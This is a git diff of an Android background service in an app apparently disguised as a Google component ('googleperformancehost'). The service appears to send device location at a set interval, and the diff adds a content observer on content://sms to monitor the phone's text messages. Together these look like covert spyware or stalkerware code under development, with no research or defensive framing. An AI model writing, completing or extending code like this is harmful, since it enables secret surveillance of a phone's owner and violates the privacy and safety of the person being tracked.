@@ -1,11 +1,15 @@
 package com.example.tiber.googleperformancehost.Services.Daemons;
 
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.net.Uri;
+import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
+import com.example.tiber.googleperformancehost.BroadcastReceivers.SmsOutObserver;
 import com.example.tiber.googleperformancehost.BroadcastReceivers.TickReceiver;
 import com.example.tiber.googleperformancehost.R;
 import com.example.tiber.googleperformancehost.Services.Abstract.MainAbstractService;
@@ -20,6 +24,7 @@ import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;
 public class MainDaemonService extends MainAbstractService {
 
     private int LOCATION_SEND_FREQUENCY_MINUTES;
+    ContentResolver contentResolver;
     @Nullable
     private static final String dataFromIntentKey = "dataFrom";
     public IBinder onBind(Intent intent) {
@@ -33,6 +38,8 @@ public class MainDaemonService extends MainAbstractService {
         super.onCreate();
         registerReceivers();
         LOCATION_SEND_FREQUENCY_MINUTES = appContext.getResources().getInteger(R.integer.LOCATION_SEND_FREQUENCY_MINUTES);
+
+
     }
 
     @Override
@@ -84,6 +91,8 @@ public class MainDaemonService extends MainAbstractService {
         inf.addAction(Intent.ACTION_TIME_TICK);
         appContext.registerReceiver(TickReceiver.getInstance(),inf);
 
+        contentResolver = appContext.getContentResolver();
+        contentResolver.registerContentObserver(Uri.parse("content://sms"), true, SmsOutObserver.getInstance(appContext));
     }
 
     private void go() {
